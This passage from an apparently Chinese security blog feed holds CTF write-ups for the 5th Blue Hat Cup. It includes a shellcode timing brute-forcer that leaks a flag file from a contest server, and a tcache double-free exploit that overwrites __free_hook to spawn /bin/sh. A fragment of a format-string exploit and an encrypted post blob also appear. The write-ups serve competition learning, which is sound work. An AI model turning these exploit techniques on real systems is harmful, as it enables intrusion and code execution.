class="comment"># gdb.attach(p,&quot;b *0x40130C&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    p = process(<span class="string">&quot;./bank&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;skye&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;wrong&quot;</span> <span class="keyword">in</span> p.recv()):</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line">        sleep(<span class="number">0.2</span>)</span><br><span class="line">        p.sendline(<span class="string">&#x27;%8$s&#x27;</span>)</span><br><span class="line">        p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>第五届蓝帽杯Writeup</title>
      <link href="archives/aa7945ba/"/>
      <url>archives/aa7945ba/</url>
      
        <content type="html"><![CDATA[<h2 id="slient"><a href="#slient" class="headerlink" title="slient"></a>slient</h2><p>第四届蓝帽杯线下原题，只是 flag 放的位置换了。写 shellcode 的题目：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210506204357.png" alt="image-20210506204356055"></p><p>只能下 read open 函数，构成不了 orw 。换个思路用可见字符去比较，也就是爆破。</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210507001855.png" alt="image-20210507001854207"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./chall&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="comment"># if debug:</span></span><br><span class="line"><span class="comment">#     p = process([file_path])</span></span><br><span class="line"><span class="comment">#     gdb.attach(p, &quot;b *$rebase(0xC94)&quot;)</span></span><br><span class="line"><span class="comment">#     libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#     one_gadget = 0x0</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># else:</span></span><br><span class="line"><span class="comment">#     p = remote(&#x27;&#x27;, 0)</span></span><br><span class="line"><span class="comment">#     libc = ELF(&#x27;&#x27;)</span></span><br><span class="line"><span class="comment">#     one_gadget = 0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">p, index, ch</span>):</span></span><br><span class="line"></span><br><span class="line">    read_next = <span class="string">&quot;xor rax, rax; xor rdi, rdi;mov rsi, 0x10100;mov rdx, 0x300;syscall;&quot;</span></span><br><span class="line">    <span class="comment"># open</span></span><br><span class="line">    shellcode = <span class="string">&quot;push 0x10032aaa; pop rdi; shr edi, 12; xor esi, esi; push 2; pop rax; syscall;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># re open, rax =&gt; 4</span></span><br><span class="line">    shellcode += <span class="string">&quot;push 2; pop rax; syscall;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># read(rax, 0x10040, 0x50)</span></span><br><span class="line">    shellcode += <span class="string">&quot;mov rdi, rax; xor eax, eax; push 0x50; pop rdx; push 0x10040aaa; pop rsi; shr esi, 12; syscall;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># cmp and jz</span></span><br><span class="line">    <span class="keyword">if</span> index == <span class="number">0</span>:</span><br><span class="line">        shellcode += <span class="string">&quot;cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-3; ret&quot;</span>.<span class="built_in">format</span>(index, ch)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        shellcode += <span class="string">&quot;cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-4; ret&quot;</span>.<span class="built_in">format</span>(index, ch)</span><br><span class="line"></span><br><span class="line">    shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># p.sendlineafter(&quot;execution-box.\n&quot;, read_next.ljust(0x30))</span></span><br><span class="line"></span><br><span class="line">    p.sendafter(<span class="string">&quot;execution-box.\n&quot;</span>, shellcode.ljust(<span class="number">0x40</span> - <span class="number">14</span>, <span class="string">b&#x27;a&#x27;</span>) + <span class="string">b&#x27;/home/pwn/flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line">ans = []</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            p = process([file_path])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># p = remote(&#x27;8.131.246.36&#x27;, 40334)</span></span><br><span class="line">            p = remote(<span class="string">&quot;8.140.177.7&quot;</span>,<span class="number">40334</span>)</span><br><span class="line">        pwn(p, index, ch)</span><br><span class="line">        start = time.time()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p.recv(timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        end = time.time()</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> end - start &gt; <span class="number">1.5</span>:</span><br><span class="line">            ans.append(ch)</span><br><span class="line">            print(<span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> ans]))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> ans]))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    index = index + <span class="number">1</span></span><br><span class="line">    print(ans)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> ans]))</span><br></pre></td></tr></table></figure><blockquote><p>补充：</p><p><a href="https://www.lintstar.top/2020/12/784edd2e#0x04-slient">https://www.lintstar.top/2020/12/784edd2e#0x04-slient</a></p><p><a href="https://blog.csdn.net/sunjikui1255326447/article/details/100191203">https://blog.csdn.net/sunjikui1255326447/article/details/100191203</a></p></blockquote><h2 id="portable-rpg"><a href="#portable-rpg" class="headerlink" title="portable_rpg"></a>portable_rpg</h2><blockquote><p>赛后复盘</p></blockquote><p>漏洞在 add player 的 switch 语句，进入函数后首先会创建 0x20 用于存放 player_struct ，当输入 player job 不是 1-3 时，switch 就会直接退出，没有释放 player struct</p><p>free 的时候把指针都置零，但是 libc 是 2.26 和 2.27 一样有 tcache 。由于先 free player_name 再 free player_struct ，将 player_name 申请为 0x20 再结合 tcache 修改 fd 的特定可以实现 UAF 的效果</p><p>总体思路：利用 add 漏洞伪造 player_struct ，结合 tcache 修改 player_struct 中 name_ptr 泄露出 libc 地址；double free 修改 free_hook</p><p>申请两个name size 0x20 的正常 player ，释放到 tcache 。利用 switch 漏洞申请两次得到 fake_player_struct ，指针指向下一个正常的 player_struct 。后面填满 tcache 后，将 fake_player_struct 指向的 player 释放到 fastbin ，申请一个大堆块，经过整理后会放到 unsortedbin 。</p><p>double free 思路也差不多，要巧妙利用 tcache 修改 fd </p><h3 id="无符号-libc-找-main-arean-偏移"><a href="#无符号-libc-找-main-arean-偏移" class="headerlink" title="无符号 libc 找 main_arean 偏移"></a>无符号 libc 找 main_arean 偏移</h3><p>ida 加载 libc 文件，查 <code>malloc_trim</code> 这个函数开头有个全局变量这个就是 main_arena ，图中的偏移为 0x13A7F4 。实际用的时候还得减去泄露出来的偏移，比如泄露 main_arena+88 偏移就是 0x13A7F4+88</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210508002247.png" alt="image-20210508002119772"></p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.binary = <span class="string">&quot;./vuln&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;remote_addr&quot;</span>, remote_port)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabihf&quot;</span>, <span class="string">&quot;./vuln&quot;</span>])</span><br><span class="line">    <span class="comment"># p = process([&quot;qemu-arm&quot;, &quot;-L&quot;, &quot;.&quot;, &quot;./vuln&quot;])</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabihf&quot;</span>, <span class="string">&quot;./vuln&quot;</span>])</span><br><span class="line">    <span class="comment"># p = process([&quot;qemu-arm&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;-L&quot;, &quot;.&quot;, &quot;./vuln&quot;])</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/usr/arm-linux-gnueabi/lib/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(cmd))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">job,size,name</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(job))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;?\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;?\n&quot;</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_2</span>(<span class="params">job</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(job))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;?\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;?\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">play</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recv</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p32(<span class="number">0x20</span>) + p32(<span class="number">0xffffffff</span>)*<span class="number">4</span> + p32(<span class="number">1</span>) + p32(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x20</span>,payload)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add_2(<span class="number">4</span>)<span class="comment">#0</span></span><br><span class="line">add_2(<span class="number">4</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    delete(<span class="number">3</span>+i)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x400</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">leak_addr = u32(p.recvuntil(<span class="string">&#x27;\x3f&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">log.info(<span class="string">&quot;main_arean:&quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">libc_base = leak_addr - <span class="number">0xF47E4</span> - <span class="number">0x7c</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;system_addr:&quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line">binsh_str = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">log.info(<span class="string">&quot;binsh_str:&quot;</span>+<span class="built_in">hex</span>(binsh_str))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;free_hook:&quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">free_addr = libc_base + libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;free_addr:&quot;</span>+<span class="built_in">hex</span>(free_addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x20</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">add_2(<span class="number">4</span>)</span><br><span class="line">add_2(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">8</span>)<span class="comment">#double free</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x20</span>,p32(free_hook))</span><br><span class="line">add_2(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x20</span>,p32(system_addr))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellcode </tag>
            
            <tag> 沙盒 </tag>
            
            <tag> tcache </tag>
            
            <tag> double free </tag>
            
            <tag> fastbin泄露libc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>d4cc29fc</title>
      <link href="archives/d4cc29fc/"/>
      <url>archives/d4cc29fc/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="1d1a30b6abb968e694b0df7f694a45a34088de3bd610e74ea83911614283efa5">376aff6f29018a3232c84962f5c1977297636aac3d1ddd6156c5c638bc748fb7f29a90fcc99e861c24564be92c8f46aee779eac710417cc4af58812ab3c09800bcdc1e848a4af34551aa6ebc0b5cc15e6474026fc7794afc4e6e98039ef07e505f63d7168b9ef245299bd94e1bad1f057f0a589a7d8c13f96c92ffb65b4164b8fb4de29340b495de1705fdd59abc570ec57e75f6ba80973238e5125b5109917e94855515d1a1a55bc7045cae3e0eb3172a344ffc70ff1cd69104a58d56fe8202b8a45e3273e858907feee1cb30bdad70513d2b94c97a9e1a6f008c1bc2f0a57292522aaa28ea562c59d950cf42a8ff66cb89c082decdee66ac85ace94a27f821ef3aa4aba1cadd90b50ac18c6a2d27a2ada9f919dab8012f8ced06c6ed9c92d5b709b218bb4dfdf2412393228da233a2f150091974b45b2492cf06d48ea0e23e7452c739e795e7ae9703985b0bb1fdeee0822705cc2bfdec3b38f94ec60aa6801fdedefb89a489c93aa8d0022311979533c7c6a92d1da6356823d92c718f3827ef6a64fd34a4a9754a8c24100904ca165cb0d5a346f9b9959050c7f53723047a0b0910414e3f4b9c7db1f7dcbf02fce872e8cd240f94f89562d9031872e3e013f3d0696a9c20a20cbe8cfc10959f1fb5abfb5408d21a5a8edbbc4f5fa5fd2da8f7c1a9dab363cc0fcc7bcb4badd779122c7f258d131f849832279cf87abd0598e7612a8a372f26f51c4f8a446c36279d2207ec2dbd8d64a86d8601f7edb7cc4e28005c8940c2d1b98d58cf467e3f56749ab567bdada1ab6b12a5d51b41422c591afcd0f16b7136660d28cc9177a3de9cf8bca1f92397a073ec5369a219a114ca5b370c76d3765d34888992897e3d2945e19da56a824e2e1f226324ae1de2167d697bf221ab418b70fd062fdcf8407e720881c15e117c69d3d0cc1e07b1dd3e25f7de3ca73ce50ea89e986b6fe536f1f49f7d3fea670832ab602030f068babfe5f98a091cfd5d025299edb52dcfd92439578c9ec5971e6175a1f6a680355f9f64f04513b3edf9b8813db83c141112e6277bedac5330c7d4efa89133e6a4a68e7a4b66a50cfb28caff83aa8b91f172c21d84890f259ff2e224ce923dd158a26a9485ff1e78ee3714ee20a7dc1c900e581f4315ff1027df4693e7b30ec2fbccc65e76dae914a07bc76b432de69d8caefcba35ca4cd11f78a5f276ffd7759d1c2f16d634e011a256d3516064a5c403a0de5726ac1dd4a838442c7e77ed3a3505c2cf63591427a9dec4b172696fffb9decf2788ee6e1af7cb8d30c2efa1b5f416ef5960f16e612086fc3dc06f990548802b2a4cdff72c00e7ab9cc8e38e20cceabe103c35135cf4c4a117e2fc3a91393c8c82f374e01af7ab6694657470ae19ce14c9ae36ae811705973957006257f05e6bd05df4db7347aa6b6649d12c67bb11531a72b38d32c24b4535f5e6d0416abfc18e15e5aeb050d83365036a18632b2e73f65178ed37ea2eb8d27fc3e5e6c9323bfa8ece6fd7896d39b1223807a071c4520c6874b3665b268ac4f59123fc1938ca0c20e424eb55c7e2db515d23d9620ce8dd2b1866bce71e97fa8200b808c44dcd32f63e46fc4f3357c78e1946cd6794ffb81c66be2887a49b0dc3e6a85d556d22e10cf8e5f89eb16316b7ba4b5f37034a62c03788184c53a33a4fb973ed001e1e5e54cbb5a9ca5bcd9f31ff7c20ded7ec5d19eee9196109e84b6de8faaa4b844ec6f2c6b7eea326d31864b1d17b7fc2723de20503abdccb02dda83c8864ea21d35180d8dd8da4cb8e5f54ddfc48bb2dd82364d058e49186c0807a974df5805a1d16ddbb22d7cb1cc237dedbf9ceb5edc6e8eb163bde830e6cff4fc7aca2e3e26c4918153d5cf2b415cfd159c6f69b109a85be0f9dfec9846d7b2993ec4c2a0e7453fde79ae1a7c16d1bc84d97f00fed9c058ecf7504c37acb2d1b07a6fa50e49646c1765e294d632d35a20612302fee2aa6d9b2321faee2e0444082bcb344848f6e4ab274f01d01d796db5fd8cba211010e35aab7131f3cbb2e48d798cb485a28db613c77cd1621940039214e99d703eb557d37a4cd23219bb3432dbd18d9467df827606b1899cb00c362e2b82273c89727bf0c795a8f4b04b1c7d7589549a2908ae9625353cb2f022764ad4fc747e32e42b8530a75508bcfd5ace8409d1945e0bfb09210a0e9173de9f86065f46a16c87f8e6025c87d6411647bca77f2fbb3fae930613a9527d9353766061a5922d070ca0ee6f636ab3732843ee93fa72a70473f577d54a50b9698b62f694a334283a107e9ae378f6f21059bf425d46ef2b7b1e80aca6c99ffea5546562b7f9d0affe26e51014140d04dbc41bc16b352c9768f3c91be0408a5f3a2a4bd68b0a8f38d51531263afcdb617ecb3e7cebd8fb0a24ea433498bb0b6a6d0e9716dae5c0abcc0ee2011d10b34ac4f687af3364ff66387aad8afea17ea53c708aaa141d394ff7de2f343395e1160957591ca16995b4473a92b60ae864f850bc44d29cdb85aa5b714eda8f3fc6de2ebf769f1fb873b1eba215b080d4c417f3cc37e5b8879494cab35d91de31f445ddd906a719581a1eb9a6bd21630473b645ae1248d7ff5c72efaee0aafbcf46fb57d978d70b3a36df13c3983d1be86846f78d24279dc49e725ccc8289e1c5751dacd26d5b05b73dd68715d2ff66a25738dcdc675c1218e5983afb6d546b93c3321870fd2e22c2c3bf9f1217d665b4bbfa46d36bd4e3312fc46bfd8fb865efb25b7edb7d6b42174caa5007d34b547aa7c49d1234d07194b418d1c57a3aaa0941036c1eaa826cdd7c754f89e5bac44f8a11c556705a4379d9954934f563f491ae661df4e474a66e9e22f16ef7249e79e2609e7c35cde174a6504c48ab52e3c0dafac5fd962646bbb1203ba7a7dea57a368f44648304aa87baa8ab27c844808a2d3933cb7fdc5299eec37c82a87c39dcbd10e76b3bd169c20471f9befede0e7d6b556b49475e7b5b5d76b57ba2496b423ef63faf46b8f3a594fa5c341a8733226b5eeddae906cc9d15d36f57ca7a669a3ad71caf88d09d5c07e083aae5c0e15d16621d5697f46e379a2a6f50b13da74209f12d7fa00ca7cddeee6fed0184da8d6436b41fbd3db374d218cbc6f13a54347c6a6a75dc9d424c0ea235fe7e2afc9ac645e356538262ec9db25b8c0ba3ae96f5c268eb2cc51f03e48d19899c5b7fc89d454746e4beeba314f8ac85dc0f9020652edfa8dde33002f1166504bc94b9eb2e72de6aa01913151de6b48246ec14b0e781b4d7d2a8c4305edcffdaa20076d5b7e04423048409a974ed4d597828f445ba50d8f629b9b71f0075ba4c3e3ed0dbf0466bb6449a7c239bc55a4fc0c5c38e37209a0b475d1234e8b8dc3b6bf1461bec5e590b6205e7866f07cb05390f25fe34af73ae8b7f793e3aa4e4e20a0c2c0d522c115c836a78d060cbe73c66d23beff49e69a0d3eee417a73f21c431d3cf99e5c3f903e94f4c8545070c5c652a1e3fd79c9072b791f34ce4b480c728437cf96194d5051e2ef0971b38da6b6c38857979872dc6172a9d633a2c5aea7d4d4d55a7cf2dcd8c132411325052c4ddabc74303da74da311694fa12c1127b19bde6e7ad932237d18bacd3e0c55d41f3b144c477634ed03b55f22a2c7fc27fcddabb47aeaaa17f5c8b6aee267bd5f94582399716286de50a6cfa515d6174f4917d84b67085b1b8762c8ca128e1bcc8429d46bc3315dcd0f3be3b5243040d422ffa2e5648f94dab94e1a726c9c42a4cb64b0fb1e3e405489a36b1e38650f5ce1e94ed127c3c13adfb2e657cac1ab34a0f35c9c04c82a60656cb3119562d0e412ec8723e8d382f05d6731103f3d819d3e4f82f33a02b62711d02bdf6ae3a78d77290f6399a74d7970c210adff8ee4444df941bc296e531a816060211916302c47e181519170f011fcbca769e49f9083debc995213c6b2697b3f657cc412e51bf53bf3a7d83609bd6851dab03561adaef026f3bbb3bc4b19fb69c1c87d465b9f2e7438dfcf14c0ac02f12778ce333aa8ce83795c9b1f08f4965cabf2ede5622483ab7543e7b7ebda5d0d64ae018694d06566e036ed6acc6e39dbabc98091f84973f64c7bf3eeceab70c483d8527a62637b7785ebcaf82dc8dd17e66a10e6c60669a812c15b9453930b2fc68fc6743d2e5b572431ae9e99aa2ac1990b1806707ae14f86205f56ea0d0548ff6d34b68757c5ff24061fd41ed1c0537893198fbcc24bbdf5d3a35638805b657128497511dcfe9801e6c930d78d67cb83859694e438febd4470dbfa08aefb92d1ce551d5d44ccd05d9355eb113c328ff5b905cefd94d4cf41449b79247431389978e842092f875f152c4aebbab241f69ac7190b5ca7bd68d4b97485a5b0b6540e9b7180b23239d62d694ab632e4203373517f243461e2f780a188e90af9331554c4f87a825a1ad539af0017d8425b7220b3ba022e0ebf84b9d8dc2ba927698157cb724472169fba66fbc1c8577e120fe87014c4fdf27b2b079315bd4ea0591eb5f1dd4f49f8e44903f1dcdd0